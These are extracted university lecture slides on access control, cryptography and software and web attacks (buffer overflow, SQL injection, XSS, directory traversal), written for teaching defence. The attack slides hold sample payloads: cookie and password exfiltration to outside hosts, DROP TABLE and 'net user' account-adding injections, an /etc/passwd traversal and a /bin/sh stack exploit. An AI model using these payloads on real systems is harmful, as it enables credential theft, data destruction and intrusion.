<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\Access-Control\CompNetSec5_Access-Control.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security (372-1-460-1)
Access Control
Dept. of Software and Information 
Systems Engineering, Ben-Gurion University
Prof. Yuval Elovici, Dr. Asaf Shabtai
{elovici, shabtaia}@bgu.ac.il
Spring, 2019
Access Control
• ITU-T (International 
Telecommunication Union) 
• Recommendation X.800 defines access 
control as follows: 
“The prevention of unauthorized use of a 
resource, including the prevention of use 
of a resource in an unauthorized manner.”
2
Access Control Principles
• Authentication: 
– Verification that the claimed identity of a user or other system 
entity are valid.
• Authorization: 
– The granting of a right or permission to a system entity to access a 
system resource. 
– This function determines who is trusted for a given purpose.
• Audit: 
– An independent review and examination of system records and 
activities 
– test for adequacy of system controls, to ensure compliance with 
established policy and operational procedures, 
– detect breaches in security
– recommend any indicated changes in control, policy and procedures.
3
Access Control Principles
4
Multiple Access Control Policies
5
DAC
Entity can 
enable 
another 
entity to 
access some 
resources
RBAC -(Roles and rules defined in 
the system controls the access
MAC
Entity cannot 
enable 
another 
entity to 
access some 
resources
Access Control Requirements
• Reliable input (authenticated user, IP address…)
• Support for proper specifications
• Least privilege
• Separation of duty
• Open and closed policies
• Policy combinations and conflict resolution
• Administrative policies
• Dual control
• Authorization creep
• Security domain – all resources and users that are 
working under the same security policy
• Single-Sign-On (SSO)
6
Access Control Basic Elements
• subject – entity capable of accessing objects
– User or application gains access by process
– typically held accountable for the actions they initiate
– often have three classes: 
• owner (e.g files, system administrator, project leader), 
• Group (user may belong to authorization group who share same privileges)
• World (the least amount of authorizations not included in Owner,Group)
• object – resource to which access is controlled
– entity used to contain and/or receive information
– protection depends on the environment in which access control 
operates 
• access right – describes the way in which a subject may access
an object
– e.g. read, write, execute, delete, create, search
7
Discretionary Access Control (DAC) 
• Scheme in which an entity may enable
another entity to access some resource
• Often provided using an access matrix
– one dimension consists of identified subjects 
that may attempt data access to the resources
– the other dimension lists the objects that may 
be accessed
• Each entry in the matrix indicates the 
access rights of a particular subject for a 
particular object
8
Access Matrix
9
Usually Sparse Matrix, why ?
Example of Access Control Structures
10
• (b) ACLs = Access Control Lists
– Per columns = per object
• (c) Capability ticket
– Per row= per subject (user\system)
– Can also contain default\public entry
Example of Access Control 
Structures – Authorization Table
11
Extended Access Control Matrix
12
Access Control Function
13
Access Control System 
Commands 
14
Example: UNIX File Access Control
• Inode (Index node) = control 
structure needed for OS for 
particular file. Contains:
– Each user has unique user identification 
number (user ID)
– Each user is a member of a primary 
group identified by a group ID
– 12 protection bits
• specify read, write, and execute 
permission for the owner of the file, 
members of the group and all other users
– First 9 bits include authorization to 
USER,GROUP and other.
– the owner ID, group ID, and protection 
bits are part of the file’s inode17
Traditional UNIX 
File Access Control
• Last 3 bits, specify additional behaviors:
• “set user ID”(SetUID)
• “set group ID”(SetGID)
– system temporarily uses rights of the file owner / group in addition 
to the real user’s rights when making access control decisions
– enables privileged programs to access files / resources not 
generally accessible
• sticky bit 
– when applied to a directory it specifies that only the owner of any 
file in the directory can rename, move, or delete that file
• superuser
– is exempt from usual access control restrictions
– has system-wide access
18
Role-Based Access Control (RBAC)
19 Aadvantage over DAC ?
RBAC - Access Control Matrix
20
• Assigning Users to Roles:
• More Users than Roles
• User Can be assigned to multiple roles
• Roles can be assigned to multiple users
• Assigning Roles to Objects:
• More Objects than Roles
• Role can be treated as an object – for role 
hierarchies definition.
Role-Based 
Access 
Control
Models
21
Minimum functionality of RBAC 
system
Example of Role Hierarchy – RBAC1
22
Constraints – RBAC2
• Provide a means of adapting RBAC to the specifics of 
administrative and security policies of an organization
• A defined relationship among roles or a condition related to roles
• Mutually exclusive roles
– a user can only be assigned to one role in the set (either during a 
session or statically)
– any permission (access right) can be granted to only one role in the set
• Cardinality
– setting a maximum number with respect to roles
• Prerequisite roles
– dictates that a user can only be assigned to a particular role if it is 
already assigned to some other specified role
23
Other Access Control Models
• Context-bases access control (location)
• Rule-based access control (calendar)
• Content-based access control 
(confidentiality)
28
Information classification
Why is it important ?
• Examples
– unclassified, confidential, secret, top secret (used by US 
government)
– public, internal use, confidential (used in the private sector)
• Everyone should know how sensitive or critical is the information 
in order to handle it appropriately
• To be able to provide proper security level and control measures 
(e.g., avoid unauthorized disclosure)
• To be able to comply with the organization management policy, 
regulations
• Follow best practices: 
– least privilege principle, 
– compartmentalization, 
– need-to-know, 
– separation of duties29
Multilateral Security
• Multilevel Security (MLS) enforces access 
control up and down
• Simple hierarchy of security labels may not 
be flexible enough
• Multilateral security enforces access 
control across by creating compartments
• Suppose TOP SECRET divided into TOP 
SECRET {CAT} and TOP SECRET {DOG}
• Both are TOP SECRET but information flow 
restricted across the TOP SECRET level
Multilateral Security
• Why compartments?
– Why not create a new classification level?
• May not want either of
– TOP SECRET {CAT}  TOP SECRET {DOG}
– TOP SECRET {DOG}  TOP SECRET {CAT}
• Compartments allow us to enforce the need 
to know principle
– Regardless of your clearance, you only have 
access to info that you need to know
Multilateral Security
• Arrows indicate “” relationship
 Not all classifications are comparable, e.g.,
TOP SECRET {CAT} vs SECRET {CAT, DOG}
TOP SECRET {CAT, DOG}
TOP SECRET {CAT}
TOP SECRET
SECRET {CAT, DOG}
SECRET {DOG}
SECRET
TOP SECRET {DOG}
SECRET {CAT}
Information classification
Process
• Define/develop functional policies and 
procedures
– Identify the appropriate number of 
classification levels and their definitions
– Define the classification process
– Define data/information owners
– Declassification
– How information in each class should be 
handled/protected (e.g., labeling magnetic 
media and hard copy, encryption)
33
Roles and responsibilities
• Data\system owners
– Classify data and systems
– Set user access to data and systems
– Decide on business continuity priorities
• Custodians
– Handle data and systems that do not belong to 
them
– Ensure the security of data and systems 
according to the owners’ specification
34
Bell-LaPadula (BLP) 
Confidentiality Model (1973)
• By David Bell and Leonard LaPadula
• Hierarchical, 
• Addresses the confidentiality of information in a system
• Mandatory access control
• Formalize the U.S. Department of Defense (DoD) 
multilevel security (MLS) policy; the basis for the Orange Book
• Simple security property – read capability only
– A subject can read information at or below his level of secrecy, but 
cannot read any information above his level of secrecy (no read up)
• Star property – write capability only
– A subject can write information at or above his level of secrecy, but
cannot write any information above his level of secrecy (no write down)
• Strong Star property – read and write capability
– A subject can read and write information only at his level of secrecy
Assigned level
Lower secrecy level
Higher secrecy level
35
Covert Channel
Covert Channel
• MLS designed to restrict legitimate channels 
of communication
• May be other ways for information to flow
• For example, resources shared at different 
levels may signal information
• Covert channel: “communication path not 
intended as such by system’s designers”
Covert Channel Example
• Alice has TOP SECRET clearance, Bob has 
CONFIDENTIAL clearance
• Suppose the file space shared by all users
• Alice creates file FileXYzW to signal “1” to 
Bob, and removes file to signal “0”
• Once each minute Bob lists the files
– If file FileXYzW does not exist, Alice sent 0
– If file FileXYzW exists, Alice sent 1
• Alice can leak TOP SECRET info to Bob!
Covert Channel Example
Alice:
Time:
Create file Delete file Create file Delete file
Bob: Check file Check file Check file Check fileCheck file
Data: 1 0 1 01
Covert Channel
• Other examples of covert channels
– Print queue
– ACK messages
– Network traffic, etc., etc., etc.
• When does a covert channel exist?
1. Sender and receiver have a shared resource
2. Sender able to vary property of resource that 
receiver can observe
3. Communication between sender and receiver 
can be synchronized
Covert Channel
• Covert channels exist almost everywhere
• Easy to eliminate covert channels…
– Provided you eliminate all shared resources and 
all communication
• Virtually impossible to eliminate all covert 
channels in any useful system
– DoD guidelines: goal is to reduce covert channel 
capacity to no more than 1 bit/second
– Implication is that DoD has given up trying to 
eliminate covert channels!
Covert Channel
• Consider 100MB TOP SECRET file
– Plaintext version stored in TOP SECRET place
– Encrypted with AES using 256-bit key, 
ciphertext stored in UNCLASSIFIED location
• Suppose we reduce covert channel capacity 
to 1 bit per second
• It would take more than 25 years to leak 
entire document thru a covert channel
• But it would take less than 5 minutes to 
leak 256-bit AES key thru covert channel!
Real-World Covert Channel
• Hide data in TCP header “reserved” field 
• Or use covert_TCP, tool to hide data in
– Sequence number
– ACK number
Real-World Covert Channel
• Hide data in TCP sequence numbers
• Tool: covert_TCP
• Sequence number X contains covert info
A. Covert_TCP
sender
C. Covert_TCP
receiver
B. Innocent
server
SYN
Spoofed source: C
Destination: B
SEQ: X
ACK (or RST)
Source: B
Destination: C
ACK: X
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\BFF,-SQL-Injection-Attacks\CompNetSec7_Attacks.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security (3-721-460-1)
SQL injection, XSS, Buffer Overflow
Dept. of Software and Information Systems 
Engineering, Ben-Gurion University
Prof. Yuval Elovici, Dr. Asaf Shabtai, 
Dr. Mordechai Guri
{elovici, shabtaia}@bgu.ac.il
gurim@post.bgu.ac.il
Buffer Overflow
5/19/20192
The process memory layout
• Process sections in memory
– Text - program code (rx)
– Data - global variables (rwx)
– Heap - dynamically allocated (rwx)
– Stack - local variables (rwx)
• Stack
– Grows towards low addresses
– Buffer overflows may be used to 
overwrite stack frame
• Heap
– Linked list if chunks
– Buffer overflows may be used to 
write at arbitrary address
Linux Windows
Low Addresses (0x00000000)
High Addresses (0xFFFFFFFF)
Buffer overflows
• Stack buffer overflow
• Heap buffer overflow
• What will happen if argv[1] is more than 128 
bytes?
– On stack: stack frame is overwritten
– On heap: internal heap data structures are 
overwritten
char buf[128];
strcpy(buf, argv[1]);
char* buf = (char*) malloc(128*sizeof(char));
strcpy(buf, argv[1]);
Buffer Overflow Exploitation
• Goal
– Execute binary code inside the vulnerable 
process
• Method
– Inject exploit code into the victim process
– Jump to the first instruction and start 
executing the code
• Applications
– Run remote command shell
– Open remote VNC session
Demo: attacking Serv-U v4.2 FTP server
Layout Of Stack
• Grows from high-end address to low-end 
address (buffer grows from low-end 
address to high-end address)
• Return Address - when a function 
returns, the instructions pointed by it 
will be executed
• Stack Frame pointer (esp) - used to 
reference to local variables and 
function parameters
Buffer overflows - example
void func(char *str) {
char buf[128];
strcpy(buf, str);
do-something(buf);
}
Suppose a web server contains a function:
When func() is called stack looks like:
argument:   str
return address
stack frame pointer
char buf[128]
ESP
Buffer overflows - example
void func(char *str) {
char buf[128];
strcpy(buf, str);
do-something(buf);
}
What if  *str is  136 bytes long?   
After   strcpy:
argument:   str
return address
stack frame pointer
char buf[128]
ESP
*str Problem:  
no length checking in  strcpy()
char buf[128]
return address
Basic stack exploit
• Suppose *str is such 
that after  strcpy stack 
looks like:
• Program P:    
exec(“/bin/sh”)
• When   func()   exits,  
the user gets shell  !
• Note:  attack code P 
runs in stack.
Program P
low
high
The NOP slide
Problem:   how does attacker 
determine ret-address?
Solution:   NOP slide
• Guess approximate stack state 
when func() is called
• Insert many NOPs before program P:
nop ,    xor eax,eax ,    inc ax
char buf[128]
return address
NOP Slide
Program P
low
high
Buffer overflow example
void func(char *s) 
{
char buf[128];
strcpy(buf, s);
}
int main (int argc, char **argv) 
{
if (argc > 1)
func(argv[1]);
return 0;
}
Exploiting Buffer Overflow
EIP got “AAAA”
int main (int argc, char 
**argv) 
{
if (argc > 1)
func(argv[1]);
return 0;
}
push argument
push EIP
jump to function
pop argument
save previous EBP
set current EBP
allocate buffer
de-allocate buffer
restore previous EBP
pop return address
return to caller
void func(char *s) 
{
char buf[128];
strcpy(buf, s);
}
The anatomy of Stack Smashing
saved EBP
buf[128]
main() local variables
parameter to func()
return address (EIP)
…
saved EBP=AAAA
AAAAAAAAAAAAAAAA
main() local variables
parameter to func()
return address=AAAA
…
• Overwriting EIP (instruction pointer) allows controlling program 
flow
• Attackers goal is to update EIP to point to the exploit code 
• Exploit code is written in the beginning of the buffer
before after
Stack during buffer overflow
Overwriting EBP and EIP
“A” x 128 + “BBBB” + “CCCC”
EBP ← “BBBB”
EIP ← “CCCC”
Obtaining bind-shell code
HOW MAY OS PROTECT APPLICATIONS 
FROM STACK SMASHING?
Run exploit 
code on stack
?
NX – “No eXecute” or DEP -
“Data Execution Prevention”
• Prevents shell code execution on stack, heap or 
data
– Hardware support: AMD, Intel
– Software support 
• DEP limitations
– Windows support:
• XP SP2, Windows Server 2003 SP1, Vista
• Requires compilation with /NXCOMPAT flag
• On Windows XP and Vista requires configuration
• On Windows Server all apps are protected by default
– UNIX support: SPLAT, RHEL 3.0 (update 3) –
ExecShield
• Enabling ExecShield: “echo 1 > /proc/sys/kernel/exec-shield”
HOW MAY ATTACKERS BYPASS 
THE NX PROTECTION?
Run exploit 
code on stack
NX ?
Return-to-libC (ARC injection)
• Control hijacking without executing code
args
ret-addr
sfp
local buf
stack
exec()
printf()
“/bin/sh”
libc.so
Return-to-libC (ARC injection)
• Overcomes NX bit protection
• Instead of executing code on stack jump to existing 
function
• E.g. call system(“/bin/sh”) and then exit(0)
• Overwrite stack frame to look like this
Saved EIP
Parameter 1
Buffer
Saved EBP
stack
Parameter 2
…
Address of system()
Address of exit()
Buffer
Saved EBP
stack
Address of “/bin/sh”
0
start of stack
frame
HOW MAY OS PROTECT APPLICATIONS 
FROM RETURN-TO-LIBC TECHNIQUE?
Run exploit 
code on stack
NX ?
Jump to 
code section
Address Space Layout 
Randomization (ASLR)
• Map shared libraries to rand location in process memory ⇒
ALSR makes it hard to guess the target address ⇒
Attacker cannot jump directly to exec function
• ASLR includes
– Image randomization: function addresses of DLLs and EXEs
– Stack randomization: addresses of local variables
– Heap randomization: addresses of dynamic allocations
– Data randomization: addresses of global variables 
• ASLR limitations on Windows
– OS support: starting from Vista, Windows Server 2008
– Only the second byte is randomized (i.e. 256 possible values)
– The code has to be linked with /dynamicbase
– Shared DLLs (e.g. kernel32.dll) will be randomized once per 
reboot
ASLR Example
Booting twice loads libraries into different locations:
Note:   everything in process memory must be randomized 
stack,   heap,   shared libs,   base image
• Win 8 Force ASLR:    ensures all loaded modules use ASLR
WHAT COMPILER PROTECTION 
MAY PREVENT BOF EXPLOITS?
Run exploit 
code on stack
Jump to 
code section
?
Canary
• Compiler adds a marker field after the buffer on stack
• When the field is overwritten the process crashes
• Compiler support: VC++(/GS), GCC (-fstack-protector)
buffer[128] EBP EIPcookie
int random_cookie = rand();
void func(char *s) 
{
int cookie = random_cookie;
char buf[128];
strcpy(buf, s);
if (cookie != random_cookie)
abort();
}
Canary implementation in VS2005
Code compiled with /GS Code compiled w/o /GS
Runtime impact of /GS flag
• crash w/o /GS
• crash with /GS
Finding buffer overflows
• Use automated tools (called fuzzers)
– Run web server on local machine
– Issue malformed requests (ending with   “$$$$$” )
– If web server crashes, search core dump for  “$$$$$” 
to find overflow location
• Construct exploit (not easy given latest defenses)
• Use software in a type safe languange (Java, ML)
• Difficult for existing (legacy) code …
• Add runtime code to detect overflows exploits
– Halt process when overflow exploit detected
– StackGuard, LibSafe, …
33
Exploits and protections summary
Attack Effective protections Ineffective protections
Overwrite return address 
with payload address
NX bit, Canary, ASLR
Jump to libC Canary, ASLR NX bit
Heap overflow NX bit, ASLR Canary
Heap spraying NX bit, Canary ASLR
• Exploitation goals
– alter program logic by overwriting variables
– transfer program execution to injected shellcode
– transfer program execution to code section
• Attacks vs. protections
Web attacks – SQL 
Injection XSS
5/19/201935
OWASP Top Ten (2017)
https://www.owasp.org/index.php/Top_10_2017-Top_10
Malicious Input Attacks
• `bad’ input to (privileged) program - input 
is adversarial 
– validate input
– robustness to bad inputs
• Web security
– attack client by rogue-site
– attack server: by client or rogue-site
• SQL injection
• path/directory traversal 
• remote file inclusion (RFI)
37
SQL Injection
• The ability to inject SQL commands into the database 
engine through an existing application’s input field of 
details or search
• Almost all SQL databases and programming languages are 
potentially vulnerable
– SQL servers (MSSQL, Oracle, MySQL, Postgres, DB2), 
Developing languages (C, C++, C#, Java), Scripting languages 
(CGI, JavaScript)
• It is an input validation problem that has to be considered 
and programmed by the developer
38
Example: buggy login page (ASP)
set ok = execute( "SELECT * FROM Users
WHERE user=' " &  form(“user”)  & " ' 
AND   pwd=' " & form(“pwd”) & “ '” );
if not ok.EOF
login success  
else  fail;
Is this exploitable?
Web
Server
Web
Browser
(Client)
DB
Enter
Username
&
Password
SELECT * 
FROM Users
WHERE user='me'
AND pwd='1234'
Normal Query
Bad input
• Suppose  user = “  ' or 1=1 -- ” (URL encoded)
• Script result:
ok = execute( SELECT … 
WHERE user= ' ' or 1=1  -- … )
– the  “--” causes rest of line to be ignored
– now  ok.EOF is always false and login succeeds
• Many sites can be logged in this way
Even worse
• Suppose user = 
“ ′ ;  DROP TABLE  Users  -- ”
• Then script does:
ok = execute( SELECT … 
WHERE user= ′ ′ ; DROP TABLE Users … )
• Similarly, attacker can add users, reset pwds…
Even worse …
• Suppose user = 
′ ; exec cmdshell
′net user badguy badpwd′ / ADD --
• Then script does:
ok = execute( SELECT … 
WHERE username= ′ ′ ; exec … )
• If SQL server context runs as “sa”, 
attacker gets account on DB server
Authentication flow (sign-in)
Sign-in POST request
user credentials
POST URL
redirect to portal
set session ID
Authentication
External inputexternal input
external input is concatenated 
into an SQL statement
Authentication bypass
• SQL fragment
• -- is a comment
• WHERE clause will always 
evaluate to TRUE
• Authentication is bypassed
SELECT count(*) as cnt FROM users WHERE Email = '' OR 
'a' = 'a'; --' AND Password ='xxxx';
Additional SQL injection attacks 
• Delete data
SELECT count(*) as cnt FROM users WHERE Email = 
''; DROP TABLE users; --' AND Password ='xxxx';
• Add user
SELECT count(*) as cnt FROM users WHERE Email = 
''; INSERT INTO users 
(LastName,FirstName,Email,Password) VALUES 
('hacker','hacker','hacker@hacker.com','kuku'); -
-' AND Password ='xxxx';
How to fix: whitelist
• Email may contain digits, latters, @, . and _ 
• Positive security: define rules for valid input
How to fix: blacklist
• Negative security: search for problematic 
input instances
• Disadvantages
– requires knowledge of all problematic examples
– limits input values (e.g. password)
How to fix: escaping
• Replace ‘ by \’
• Concatenation does not result in changing 
SQL statement
Prepared statements
Input is passed as parameters 
to SQL statement
Use class PreparedStatement
Argument placeholders
Ordinary statement
Sign-in: What have we learned?
• Injection vulnerability
– malicious input is concatenated into a command 
(here: SQL statement) and changes its meaning
• Threat types
– tampering with data (e.g. adding/deleting users) 
– privilege escalation (e.g. authentication bypass)
• Secure design insights
– attacks are often associated with input; don’t 
trust input!
• Input validation techniques: whitelist, blacklist
• Safe SQL usage: prepared statements, 
escaping
An SQL injection joke
Book Search Flow
Book search POST request
POST URL
search string
session ID
Book search code
external input is 
concatenated into an SQL 
statement
SQL injection design
SQL injection
• Input string
xxxxxxxxxxx'; SELECT ID, LastName as Title, Email as 
Author, Password as Status from users;--
• Resulting SQL statement
SELECT ID,Title,Author,Status FROM books WHERE 
Title LIKE '%xxxxxxxxxxx'; SELECT ID, LastName as 
Title, Email as Author, Password as Status from users;--
%' OR Author LIKE '%xxxxxxxxxxx';SELECT ID, 
LastName as Title, Email as Author, Password as Status 
from users;--%';
• Effective SQL statement
SELECT ID, LastName as Title, Email as Author, 
Password as Status from users;
Information disclosure
Book Search: What have we 
learned?
• Vulnerability: SQL Injection
• Exploitation
– disclosure of user records and passwords in 
clear text
• Threat types
– information disclosure
– insecure password management
• Secure design insights
– store passwords securely
– data separation/segregation
Directory Traversal Attack
• Exploit GET/POST/cookie parameter:
• Server prepends path of file, e.g. sends 
~/mail/$1.txt
• What if request is../../../etc/passwd? 
• Example:
– Vulnerability: Web page contains link to: 
http://foo.org/get?f=vul.html
– Exploit:http://foo.org/get?f=../../etc/passwd
62
Message of the Day
Message of the Day POST 
requestPOST URL
file to display
contents of the file
Directory traversal
concatenation allows any file to be 
accessed with ../
Exploitation 
Source code disclosureSource code disclosure
Content-Length should be 
updated
Directory traversal solution
• Check that canonical path is in allowed 
directory
• Examples:
– C:\temp\myapp\bin\..\\..\file.txt - not 
canonical path
– C:\temp\file.txt - canonical path
What have we learned?
• Vulnerability: Directory traversal
• Exploitation
– retrieving of arbitrary files
• Threat types
– information disclosure
• Mitigations
– Convert path to canonical and verify location
– Java: java.io.File.getCanonicalPath()
– UNIX: realpath()
– Windows: GetFullPathName()
Preventing Injection Attacks
• Separate code and control from data
– costs, ability (source code? Change tool?), awareness
• Use tools to find vulnerabilities in site/server
• Preferably: `firewall` to protect all applications
– often called Web Application Firewall (WAF)
• e.g. ModSecurity (open source WAF)
– external solution – no change to applications
• Filtering approaches:
– block known vulnerabilities
– remove all `control chars` (to block unknown attacks)
• 8099i0ol;pp0llll-[?”l.’/Problem: legitimate use of 
control chars in input
69
Cross-Site Scripting Attack (XSS)
• Scripting - Web Browsers can execute commands
– embedded in HTML page
– supports different languages (JavaScript*, VBScript, 
ActiveX, etc.)
• Cross-Site - foreign script sent via server to client
– attacker “makes“ Web-Server deliver malicious script 
code
– malicious script is executed in Client’s Web Browser 
when page is requested by the client
• Attack
– steal Access Credentials, DoS, Modify Web pages
– execute any command at the client machine
What is XSS?
• An XSS vulnerability is present when an 
attacker can inject scripting code into pages 
generated by a Web application
• Methods for injecting malicious code:
– Reflected XSS (“type 1”)
• the attack script is reflected back to the user as part of 
a page from the victim site
– Stored/persistent XSS (“type 2”)
• the attacker stores the malicious code in a resource 
managed by the web application, such as a database
Reflected XSS attack
• The injected script is reflected off the 
(vulnerable / victim) web server response 
(e.g., error message, search result) that 
includes some / all of the input sent to the 
server as part of the request
• Reflected attacks are delivered to victims via 
another route, such as in an e-mail message, 
or on some other (malicious) web site
72
Reflected XSS attack
Attack Server
Vulnerable / Victim Server 
Victim
1
2
5
XSS example: vulnerable site
• search field on victim.com:
– http://victim.com/search.php ? term = apple
• server-side implementation of
– search.php:
<HTML>    <TITLE> Search Results </TITLE>
<BODY>
Results for <?php echo $_GET[term] ?> :
. . .
</BODY>   </HTML>
echo search term 
into response
Bad input
• Consider link:     (properly URL encoded)
http://victim.com/search.php ? term =
<script> window.open(
“http://badguy.com?cookie = ” + 
document.cookie)  </script>
• What if user clicks on this link?
1. Browser goes to 
http://victim.com/search.php
2. victim.com returns
<HTML> Results for <script> … </script>
3. Browser executes script:
• sends badguy.com cookie for victim.com
<html> 
Results for 
<script> 
window.open(http://attacker.com? 
... document.cookie ...) 
</script>
</html>
Attack Server
Victim Server 
Victim client
http://victim.com/search.php ? 
term = <script> ... </script>
www.victim.com
www.attacker.com
Reflected XSS attack
Attack Server
Server Victim 
User Victim
1
2
5
Email version
Stored XSS
Post Forum Message:
Subject: GET Money for FREE !!!
Body:
<script> attack code </script>
1. Attacker sends malicious code
2. Server stores message
Did you know this?
.....
3. User requests message
4. Message is delivered by server
5. Browser executes script in message
GET Money for FREE !!!
<script> attack code </script>
Get /forum.jsp?fid=122&mid=2241
Attacker
Client
Web Server
GET Money for FREE !!!
<script> attack code </script>
!!! attack code !!!
This is only one example out of many attack scenarios!
Re: Error message on startup
.....
I found a solution!
.....
Can anybody help?
.....
Error message on startup
.....
Stored XSS
Attack Server
Server Victim 
User Victim
Inject malicious 
script
1
Store bad stuff
Download it
MySpace.com   (Samy worm)
• Users can post HTML on their pages
– MySpace.com ensures HTML contains no
<script>, <body>, onclick, <a href=javascript://>
– …  but can do Javascript within CSS tags (cascading 
style sheets):
<div style=“background:url(‘javascript:alert(1)’)”>
And can hide “javascript” as “java\nscript”
• With careful javascript hacking:
– Samy worm infects anyone who visits an infected 
MySpace page   …    and adds Samy as a friend.
– Samy had millions of friends within 24 hours.
http://namb.la/popular/tech.html
Stored XSS using images
• Suppose pic.jpg on web server contains HTML !
– request for http://site.com/pic.jpg results in:
HTTP/1.1  200 OK
…
Content-Type:  image/jpeg
<html>  fooled ya </html>
• IE will render this as HTML (despite Content-
Type)
• Consider photo sharing sites that support image 
uploads
– what if attacker uploads an “image” that is a 
script?
How to Protect Against XSS 
attacks (OWASP)
• Never trust client-side data, validate input -
headers, cookies, query strings, form fields, 
and hidden fields (i.e., all parameters)
• Black listing is not enough  - there are too 
many types of active content and too many 
ways of encoding it to get around filters
• Adopt a ‘positive’ security policy that 
specifies what is allowed
ASP.NET output filtering
• validateRequest: (on by default)
– Crashes page if finds  <script>  in POST data
– Looks for hardcoded list of patterns
– Can be disabled: <%@  Page  validateRequest=“false" %> 
Scripts not only in <script>!
• JavaScript as scheme in URI
– <img src=“javascript:alert(document.cookie);”>
• JavaScript On{event} attributes (handlers)
– OnSubmit, OnError, OnLoad, …
• Typical use:
– <img src=“none” OnError=“alert(document.cookie)”>
– <iframe src=`https://bank.com/login` onload=`steal()`>
– <form> action="logon.jsp" method="post"
onsubmit="hackImg=new Image;
hackImg.src='http://www.digicrime.com/'+document.for
ms(1).login.value'+':'+
document.forms(1).password.value;" </form>
Problems with filters
• Suppose a filter removes <script
– Good case
<script src=“ ...”   src=“...”
– But then
<scr<scriptipt src=“ ...”   <script src=“ ...” 
Advanced anti-XSS tools
• Dynamic Data Tainting
– e.g., Perl taint mode
• Static Analysis
– Analyze Java, PHP to determine possible 
flow of untrusted input
Complex problems in social 
network sites
User data
User-
supplied 
application
END
5/19/201988
 
</TEXT>
</DOC>
<DOC>
<DOCNO> C:\Dan\UNI\Jarta.Projects\Hackathon\searchEngine\corpus\MoodleFiles\אבטחת-מחשבים-ורשתות-תקשורת-סמ-2\מבוא\Cryptography-2\CompNetSec3_Cryptographic-Algorithms-Final.pdf </DOCNO>
<F P=104> אבטחת-מחשבים-ורשתות-תקשורת-סמ-2 </F>
<TEXT>
Computer & Information Security (372-1-460-1)
Cryptographic Algorithms
Dept. of Software and Information 
Systems Engineering, Ben-Gurion University
Prof. Yuval Elovici, Dr. Asaf Shabtai
{elovici, shabtaia}@bgu.ac.il
Spring, 2018
1
Applications of encryption
2
Applications of encryption
3
Applications of encryption
4
Applications of encryption
5
Applications of encryption
A general UI attack:  picture-in-
picture
Using Digital signatures for code 
signing
8
Cryptography classification
• operations used
– Substitution
– transposition
• keys used
– symmetric
– asymmetric
• how plaintext is processed
– block cipher – processes input one block of elements at 
a time
• Difficult to design: must resist subtle attacks such as 
differential attacks,  linear attacks, brute-force,  …
– stream cipher – processes the input elements 
continuously
9
Cryptanalysis [595]
type of attack known to cryptanalyst
- Least info (very hard) = Brute Force on all possible keys
- Statistical tests + prior knowledge  about  plaintext’s language 
(English, Java), only weak encryption algorithms fails
- More info (still hard) – helps deducing the encryption key
- E.g., Email message has known format
- Certain key words inside specific locations in the file such as: 
“Bank Account”, “Date”
- Probable-Word-attack
- The attacker has an access to the encryption system
- Then can encrypt specific patterns that will help him to reveal 
the structure of the key
- Less common
- The attacker has an access to the encryption system
- Then can decrypt chosen ciphertext patterns that will help him to 
reveal the structure of the key
- Less common
- Combines both Chosen plaintext and Chosen ciphertext
10
Computationally secure 
encryption schemes
• encryption is computationally secure if
– cost of breaking cipher exceeds value of 
information
– time required to break cipher exceeds the 
useful lifetime of the information
• usually very difficult to estimate the 
amount of effort required to break
• can estimate time/cost of a brute-force 
attack
– on average, half of the keys must be tried
11
Advanced Encryption Standard 
(AES)
• AES is more secure and efficient than DES/3DES
• block length of 128 bits 
• key length that can be 128 /192/ 256 bits
• not a Feistel structure
• applies 10 rounds
• four stages
– substitute bytes (SubBytes)
– shift rows
– mix columns
– add round key (the only stage that uses the key)
12
Advanced 
Encryption 
Standard 
(AES)
13
Advanced Encryption Standard 
(AES)
• Plaintext and Keys (128 bit) represented by 4X4 matrix:
– each cell contains 1 byte (8 bits)
– bits are ordered by columns from the leftmost to the rightmost
• 128 bit: 1110101010000011010111001111000000000100……11000101
(E A)      (8 3)       (5 c)     (F 0)         (0 4)            (C 5)  
14
AES Round Structure
15
Substitute Bytes
• a simple table lookup in S-box
– a 1616 matrix of byte values
– a permutation of all possible 256 8-bit values
– maps each byte to a new value
• e.g. {95} maps to {2A}
• constructed using finite field properties
– designed to be resistant to known 
cryptanalytic attacks
• decrypt uses inverse of S-box
16
Substitute Bytes
17
• ab16 = 11101010
(E A)
S-box (Encryption)
18
Inverse S-box (Decryption)
19
Shift Rows
• on encryption: shift each row of State by 
0,1,2,3 bytes respectively
• ensures that each column is now spread over 
four columns
• decrypt does reverse
20
Mix Column
• mix columns
– operates on each column individually
– mapping each byte to a new value that is a 
function of all four bytes in the column
– use of equations over finite fields
– to provide good mixing of bytes in column
21
Add round key
• simply XOR State with bits of expanded 
key
• security from complexity of round key 
expansion and other stages of AES
22
Key-Expansion and creation of 
Round-Key
• Using the symmetric key 128 bit (16 
bytes)
– create expended-Key of 176 bytes
– from which create 11 different round keys 
– each key is 16 bytes = 4 words of 4 bytes
– the first key in is the original key
– using a complex finite field algorithm, each 
added Word in the expanded key depends 
on the two previous words w[i-1] and w[i-4]
23
Key-Expansion and creation of 
Round-Key
24
Expanded Key
176 byte Key (44 Words)
Word0
Word1
Word2
Word3
Original Key
16 byte Key (4 Words)
Word0
Word1
Word2
Word3
Word40
Word41
Word42
Word43
……
….
…..
……
Word4  =  F(word3,word,0)
Word5  = F(word4,word,1)
Word6  = F(word5,word,2)
Word7  =  F(word6,word,3)
Original
Key
Add round key
• simply XOR State with bits of expanded 
key
• security from complexity of round key 
expansion and other stages of AES
25
AES steps
Stage 1: SubBytes
Stage 2: ShiftRows
Stage 3: MixColumns
Stage 4: AddRoundKey
26
RSA Public-Key Encryption
• by Rivest, Shamir & Adleman of MIT in 1977 
• best known and widely used public-key algorithm 
• uses exponentiation of integers modulo a prime
• encrypt: C = Me mod n
• decrypt: M = Cd mod n = (Me)d mod n = M
• both sender and receiver know values of n and e
• only receiver knows value of d
• public-key encryption algorithm with
– public key PU = {e, n} and private key PR = {d, n}
27
RSA Algorithm [637\667]
